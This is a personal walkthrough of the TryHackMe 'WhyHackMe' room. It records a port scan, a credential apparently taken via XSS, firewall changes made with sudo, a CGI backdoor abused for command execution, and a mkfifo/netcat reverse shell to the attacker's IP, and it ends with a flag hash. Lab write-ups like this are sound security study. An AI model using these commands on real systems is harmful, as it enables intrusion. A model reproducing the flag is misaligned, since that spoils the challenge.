### 06-Jan-24-Sat

[TryHackMe | WhyHackMe](https://tryhackme.com/room/whyhackme)

![[Pasted image 20240106102021.png]]
![[Pasted image 20240106102158.png]]
![[Pasted image 20240106102241.png]]

```
┌──(root㉿kali)-[/home/kali/thm/whyhackme]
└─# nmap -sC -sV -Pn -p- --open 10.10.77.227 -oN nmap.whyhackme
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 22:38 EST
Nmap scan report for 10.10.77.227
Host is up (0.42s latency).
Not shown: 65331 closed tcp ports (reset), 201 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.44.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.96 seconds
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/thm/whyhackme]
└─# 
```

![[Pasted image 20240107145653.png]]

```
/dir/pass.txt
```

https://www.youtube.com/@TylerRamsbey

[Using XSS & Python to Steal Sensitive Data!](https://www.youtube.com/watch?v=dywZyB_ZZaA)

```
jack%3AWhyIsMyPasswordSoStrongIDK%0A
```

```
jack:WhyIsMyPasswordSoStrongIDK
```

![[Pasted image 20240109210005.png]]
![[Pasted image 20240109210812.png]]

```
find / -name update.txt 2>/dev/null
```

```
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

![[Pasted image 20240109211850.png]]

```
sudo /usr/sbin/iptables --list
```

![[Pasted image 20240109212133.png]]

```
sudo iptables -A INPUT -p tcp -s <source_IP> --dport <destination_port> -j ACCEPT
```

```
sudo /usr/sbin/iptables -A INPUT -p tcp -s 10.17.44.152 --dport 443 -j ACCEPT
```

![[Pasted image 20240109213846.png]]

![[Pasted image 20240109223748.png]]
![[Pasted image 20240109223916.png]]

```
cat /etc/apache2/sites-available/000-default.conf
```

![[Pasted image 20240109224453.png]]

```
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ScriptAlias "/cgi-bin/" "/usr/local/apache2/cgi-bin/"
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```

https://github.com/suds4131/WhyHackMe/

![[Pasted image 20240109225646.png]]

```
GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1

Host: 10.0.2.15:41312

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

DNT: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

  

HTTP/1.1 200 OK

Date: Wed, 16 Aug 2023 14:35:43 GMT

Server: Apache/2.4.41 (Ubuntu)

Content-Length: 64

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html

  

  

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)

<h2>
```

https://jaxafed.github.io/posts/tryhackme-whyhackme/

```
curl -k -s 'https://10.10.183.176:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
```

![[Pasted image 20240109230701.png]]

```
curl -k -s 'https://10.10.183.176:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.44.152 443 >/tmp/f'
```

![[Pasted image 20240109231215.png]]

```
4dbe2259ae53846441cc2479b5475c72
```

